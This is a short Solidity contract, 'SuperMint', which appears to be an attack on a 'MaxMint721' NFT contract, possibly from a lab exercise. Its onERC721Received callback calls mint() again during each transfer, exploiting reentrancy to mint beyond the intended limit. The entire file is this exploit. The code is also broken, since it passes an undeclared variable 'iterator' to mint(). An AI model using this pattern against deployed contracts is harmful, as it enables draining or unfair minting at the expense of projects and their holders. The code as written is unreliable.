// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.6;

import "./MaxMint721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SuperMint is IERC721Receiver {
  MaxMint721 implementation;
  uint maxMints;


  constructor(address _implementation, uint _maxMints) {
    implementation = MaxMint721(_implementation);
    maxMints = _maxMints;
  }

  function beginMint() external {
    implementation.mint(maxMints);
  }

  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public virtual override returns (bytes4) {
    /**@notice - check if maxMints is not 0 and then reduce its value
    before reentrance. When it's value drops below 1, reentrancy stops.
    */
    if (maxMints - 1 != 0) {
      maxMints--;
      implementation.mint(iterator);
    }
    return this.onERC721Received.selector;
  }
}
